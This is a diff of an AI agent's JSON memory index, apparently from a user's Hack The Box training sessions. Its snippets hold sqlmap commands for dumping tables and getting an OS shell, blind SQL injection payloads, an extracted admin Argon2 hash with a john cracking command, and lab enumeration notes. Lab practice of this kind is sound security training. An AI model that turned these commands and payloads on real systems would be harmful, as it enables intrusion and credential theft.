@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "updatedAt": "2026-05-11T01:27:12.624Z",
+  "updatedAt": "2026-05-12T05:56:11.702Z",
   "entries": {
     "memory:memory/2026-04-09.md:4:4": {
       "key": "memory:memory/2026-04-09.md:4:4",
@@ -23946,13 +23946,13 @@
       "endLine": 42,
       "source": "memory",
       "snippet": "**htb_document_progress v2.1.1:** Fixed path resolution bug. Now uses `realpath` to output absolute BOX_DIR paths. Subagent MUST use absolute paths provided by document.sh to avoid \"file not found\" errors in different execution contexts. ### HTB Box: Precious - IN PROGRESS - IP: 10.129.228.98 - Services: SSH (22), HTTP/nginx (80) + Phusion Passenger + Ruby - Web App: PDF conversion service from URL input - Attack Surface: SSRF, command injection, file read via PDF generation ### Key Techniques - Time-based blind SQLi: requires TIME tuning (used 3s for stable extraction) - PATH hijacking: identify privileged processes using unqualified commands - PAM exploitation: MOTD scripts run as root o",
-      "recallCount": 8,
+      "recallCount": 11,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 3.871613436937332,
+      "totalScore": 5.391464164853096,
       "maxScore": 0.5162069708108902,
       "firstRecalledAt": "2026-04-14T04:09:42.295Z",
-      "lastRecalledAt": "2026-05-11T00:22:38.211Z",
+      "lastRecalledAt": "2026-05-12T05:55:50.888Z",
       "queryHashes": [
         "d8f513267e39",
         "c39fe5ea79f0",
@@ -23961,13 +23961,17 @@
         "28018ed1f989",
         "f3391ec45f2e",
         "9015df718ada",
-        "949e16e86f1e"
+        "949e16e86f1e",
+        "4451a1fa1e6b",
+        "5deb5ba1ae91",
+        "709c320908e7"
       ],
       "recallDays": [
         "2026-04-14",
         "2026-04-15",
         "2026-05-09",
-        "2026-05-11"
+        "2026-05-11",
+        "2026-05-12"
       ],
       "conceptTags": [
         "htb-document-progress",
@@ -28984,27 +28988,34 @@
       "endLine": 215,
       "source": "memory",
       "snippet": "- Candidate: **htb_document_progress v2.1.1:** Fixed path resolution bug. Now uses `realpath` to output absolute BOX_DIR paths. Subagent MUST use absolute paths provided by document.sh to avoid \"file not found\" errors in different execution contexts. ### HTB Box: Precious - IN PROGRESS - IP: 10.129.228.98 - Services: SSH (22), HTTP/nginx (80) + Phusion Passenger + Ruby - Web App: PDF conversion service from URL input - Attack Surface: SSRF, command injection, file read via PDF generation ### Key Techniques - Time-based blind SQLi: requires TIME tuning (used 3s for stable extraction) - PATH hijacking: identify privileged processes using unqualified commands - PAM exploitation: MOTD scripts ru",
-      "recallCount": 6,
+      "recallCount": 20,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 2.804874673485756,
+      "totalScore": 8.986433941125867,
       "maxScore": 0.5132884711027145,
       "firstRecalledAt": "2026-04-18T02:48:40.254Z",
-      "lastRecalledAt": "2026-05-11T01:27:12.624Z",
+      "lastRecalledAt": "2026-05-12T05:56:11.702Z",
       "queryHashes": [
         "b5ebadcf557c",
         "42b4ac8dd856",
         "9015df718ada",
         "33318b881d46",
         "949e16e86f1e",
-        "e54778887960"
+        "e54778887960",
+        "6423929c8d7f",
+        "ec433f223cb3",
+        "2667a63a7ca2",
+        "709c320908e7",
+        "459d38c991f2",
+        "2c66baedb29a"
       ],
       "recallDays": [
         "2026-04-18",
         "2026-04-19",
         "2026-05-09",
         "2026-05-10",
-        "2026-05-11"
+        "2026-05-11",
+        "2026-05-12"
       ],
       "conceptTags": [
         "htb-document-progress",
@@ -66312,21 +66323,24 @@
       "endLine": 43,
       "source": "memory",
       "snippet": "# 2026-04-28 — Daily Log ## HTB Academy: AD Enumeration Attacks — Part II (Skills Assessment) **Session Start:** ~22:00 (Asia/Manila) **Status:** IN PROGRESS — Q1/Q2 complete, advancing toward Q3-Q12 **Next Session:** Continue from smbclient/MS01 enumeration ### Target Environment - **Attack Host:** Parrot Linux VM at `10.129.83.248` / `172.16.7.240` - **Domain:** INLANEFREIGHT.LOCAL - **Subnet:** 172.16.6.0/23 (internal network via `ens224`) ### Network Map Discovered | Host | IP | Open Ports | Notes | |------|-----|------------|-------| | DC01 | 172.16.7.3 | 53, 135, 139, 445 | SMB signing **required** | | MS01 | 172.16.7.50 | 135, 139, 445, **3389** | SMB signing **not required** | |",
-      "recallCount": 3,
+      "recallCount": 5,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 1.4878478780388833,
+      "totalScore": 2.5044021233916283,
       "maxScore": 0.5564876720309258,
       "firstRecalledAt": "2026-04-30T03:43:29.058Z",
-      "lastRecalledAt": "2026-05-09T02:36:44.076Z",
+      "lastRecalledAt": "2026-05-11T23:22:08.864Z",
       "queryHashes": [
         "e68056f39a88",
         "28018ed1f989",
-        "7b8b821d45d1"
+        "7b8b821d45d1",
+        "4451a1fa1e6b",
+        "32f64802b04a"
       ],
       "recallDays": [
         "2026-04-30",
-        "2026-05-09"
+        "2026-05-09",
+        "2026-05-12"
       ],
       "conceptTags": [
         "network",
@@ -76217,13 +76231,13 @@
       "endLine": 40,
       "source": "memory",
       "snippet": "# Neo — Daily Memory — 2026-05-09 ## HTB Academy: SQL Injection Fundamentals — Skills Assessment **Status:** Planning phase. Victor stepping out; initial recon + attack plan prepared for execution. **Target:** `https://154.57.164.64:31180/login.php` **Approach:** Black-box SQL injection assessment **Proxy:** Caido (Burp alternative) --- ### Assessment Objectives | Q | Question | Approach | |---|----------|----------| | 1 | Password hash for user `admin` | SQLi data extraction — enumerate tables, dump user creds | | 2 | Root path of web application | SQLi `LOAD_FILE` / error messages / `phpinfo` / RCE discovery | | 3 | RCE + contents of `/flag_XXXXXX.txt` | SQLi → file write shell OR st",
-      "recallCount": 24,
+      "recallCount": 29,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 13.12726571519999,
+      "totalScore": 15.722431316572708,
       "maxScore": 0.8404299540150534,
       "firstRecalledAt": "2026-05-10T14:30:09.097Z",
-      "lastRecalledAt": "2026-05-11T01:10:59.162Z",
+      "lastRecalledAt": "2026-05-12T05:55:50.888Z",
       "queryHashes": [
         "b6f3857108b5",
         "2ed3a0001b00",
@@ -76248,11 +76262,17 @@
         "4873dccf962a",
         "4a7c92a2db38",
         "10f8ab3c7456",
-        "9ac3cf90c582"
+        "9ac3cf90c582",
+        "4451a1fa1e6b",
+        "32f64802b04a",
+        "8dbbcb677b41",
+        "2667a63a7ca2",
+        "709c320908e7"
       ],
       "recallDays": [
         "2026-05-10",
-        "2026-05-11"
+        "2026-05-11",
+        "2026-05-12"
       ],
       "conceptTags": [
         "154.57.164.64",
@@ -76397,15 +76417,16 @@
       "endLine": 284,
       "source": "memory",
       "snippet": "--data='username=test&password=test123&repeatPassword=test123&invitationCode=abcd-efgh-1234' \\ -p invitationCode \\ --batch \\ --technique=BEST \\ --dbs # List databases --tables # List tables in current DB --columns -T users # List columns in users table --dump -T users # Dump all user data (admin hash!) ``` ### Assessment Progress Summary | Question | Status | Next Action | |----------|--------|-------------| | Q1 — admin password hash | 🔄 In Progress | SQLMap `--dump -T users` | | Q2 — web root path | ⏳ Pending | Post-extraction or `LOAD_FILE` / `@@basedir` | | Q3 — RCE + flag | ⏳ Pending | SQLMap `--os-shell` or manual `INTO OUTFILE` | ### Key L",
-      "recallCount": 1,
+      "recallCount": 2,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 0.49204789400100707,
-      "maxScore": 0.49204789400100707,
+      "totalScore": 1.021233904361725,
+      "maxScore": 0.5291860103607178,
       "firstRecalledAt": "2026-05-11T01:26:55.164Z",
-      "lastRecalledAt": "2026-05-11T01:26:55.164Z",
+      "lastRecalledAt": "2026-05-11T13:44:36.355Z",
       "queryHashes": [
-        "85d995572398"
+        "85d995572398",
+        "88a21009c03b"
       ],
       "recallDays": [
         "2026-05-11"
@@ -76428,18 +76449,20 @@
       "endLine": 270,
       "source": "memory",
       "snippet": "--technique=BEST \\ --dump ``` ### SQLMap Results **🎯 CONFIRMED: `invitationCode` is vulnerable to SQL injection!** | Technique | Type | Payload Example | |-----------|------|-----------------| | **Boolean-based blind** | `OR boolean-based blind - WHERE or HAVING clause (NOT)` | `abcd-efgh-1234') OR NOT 7167=7167-- idXk` | | **Time-based blind** | `MySQL >= 5.0.12 AND time-based blind (query SLEEP)` | `abcd-efgh-1234') AND (SELECT 3366 FROM (SELECT(SLEEP(5)))BzeL)-- QXnY` | ### Key Findings - **DBMS:** MySQL (heuristic test confirmed) - **Backend uses `)` closing parenthesis** — payload requires `')` to close the query properly - **276 HTTP requests** for full detection - **Injection",
-      "recallCount": 1,
+      "recallCount": 10,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 0.49099949300289153,
+      "totalScore": 4.364746844768525,
       "maxScore": 0.49099949300289153,
       "firstRecalledAt": "2026-05-11T01:26:55.164Z",
-      "lastRecalledAt": "2026-05-11T01:26:55.164Z",
+      "lastRecalledAt": "2026-05-12T02:39:47.297Z",
       "queryHashes": [
-        "85d995572398"
+        "85d995572398",
+        "6423929c8d7f"
       ],
       "recallDays": [
-        "2026-05-11"
+        "2026-05-11",
+        "2026-05-12"
       ],
       "conceptTags": [
         "boolean-based",
@@ -76481,6 +76504,101 @@
         "code",
         "abcd",
         "efgh"
+      ]
+    },
+    "memory:memory/2026-05-09.md:321:337": {
+      "key": "memory:memory/2026-05-09.md:321:337",
+      "path": "memory/2026-05-09.md",
+      "startLine": 321,
+      "endLine": 337,
+      "source": "memory",
+      "snippet": "```bash # Q2 — Web root path sqlmap -u \"https://<NEW_IP>:<NEW_PORT>/api/register.php\" \\ --data='username=test&password=***&repeatPassword=test123&invitationCode=abcd-efgh-1234' \\ -p invitationCode --batch --sql-query=\"SELECT @@basedir\" # Q3 — OS shell attempt sqlmap -u \"https://<NEW_IP>:<NEW_PORT>/api/register.php\" \\ --data='username=test&password=***&repeatPassword=test123&invitationCode=abcd-efgh-1234' \\ -p invitationCode --batch --os-shell ``` ### Status **✅ Q1 COMPLETE. Q2/Q3 ready for execution on next session. John cracking in background.**",
+      "recallCount": 9,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 3.908311289548873,
+      "maxScore": 0.43425680994987487,
+      "firstRecalledAt": "2026-05-12T02:39:14.621Z",
+      "lastRecalledAt": "2026-05-12T02:39:47.297Z",
+      "queryHashes": [
+        "6423929c8d7f"
+      ],
+      "recallDays": [
+        "2026-05-12"
+      ],
+      "conceptTags": [
+        "new-ip",
+        "new-port",
+        "api/register.php",
+        "abcd-efgh-1234",
+        "sql-query",
+        "os-shell",
+        "q2/q3",
+        "bash"
+      ]
+    },
+    "memory:memory/2026-05-09.md:291:328": {
+      "key": "memory:memory/2026-05-09.md:291:328",
+      "path": "memory/2026-05-09.md",
+      "startLine": 291,
+      "endLine": 328,
+      "source": "memory",
+      "snippet": "|--------|-------------------| | UserID | `1` | | Username | `admin` | | Password | `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU` | | InvitationCode | `JKTN-OIYP-7672` | | AccountCreated | `2026-05-11 03:03:46` | ### Hash Details - **Type:** Argon2i (modern password hashing) - **Parameters:** `v=19, m=2048, t=4, p=3` - **Salt:** `dk4wdDBraE0zZVllcEUudA` - **Hash:** `CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU` ### Hash Cracking (Background) ```bash john --format=argon2 /tmp/admin_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt ``` **Status:** Running in background (PID: 3906612) **ETA:** Argon2 with m=2048,t=4,p=3 is slow — could tak",
+      "recallCount": 3,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 1.7686085426078448,
+      "maxScore": 0.7758685731158863,
+      "firstRecalledAt": "2026-05-12T03:42:36.316Z",
+      "lastRecalledAt": "2026-05-12T05:40:26.672Z",
+      "queryHashes": [
+        "c0e8437135da",
+        "443429e54d2d",
+        "7b9da0f21cf7"
+      ],
+      "recallDays": [
+        "2026-05-12"
+      ],
+      "conceptTags": [
+        "jktn-oiyp-7672",
+        "tmp/admin-hash.txt",
+        "usr/share/wordlists/rockyou.txt",
+        "userid",
+        "username",
+        "admin",
+        "password",
+        "argon2i"
+      ]
+    },
+    "memory:memory/2026-04-13.md:232:249": {
+      "key": "memory:memory/2026-04-13.md:232:249",
+      "path": "memory/2026-04-13.md",
+      "startLine": 232,
+      "endLine": 249,
+      "source": "memory",
+      "snippet": "- status: staged - Candidate: Assistant: Yes. Nikto uses `-p` for port: ```bash nikto -h 154.57.164.70 -p 31232 ``` Or you can combine host and port: ```bash nikto -h 154.57.164.70:31232 ``` For your case with the vHost: ```bash nikto -h inlanefreight.htb -p 31232 ``` Or all together: ```bash nikto -h inlanef - confidence: 0.00 - evidence: memory/.dreams/session-corpus/2026-04-13.txt:119-119 - recalls: 0 - status: staged - Candidate: User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3264\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Mon 2026-04-13 14:26 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes",
+      "recallCount": 1,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 0.4203792184591293,
+      "maxScore": 0.4203792184591293,
+      "firstRecalledAt": "2026-05-12T05:56:02.117Z",
+      "lastRecalledAt": "2026-05-12T05:56:02.117Z",
+      "queryHashes": [
+        "459d38c991f2"
+      ],
+      "recallDays": [
+        "2026-05-12"
+      ],
+      "conceptTags": [
+        "154.57.164.70",
+        "inlanefreight.htb",
+        "0.00",
+        "119-119",
+        "message-id",
+        "sender-id",
+        "status",
+        "staged"
       ]
     }
   }
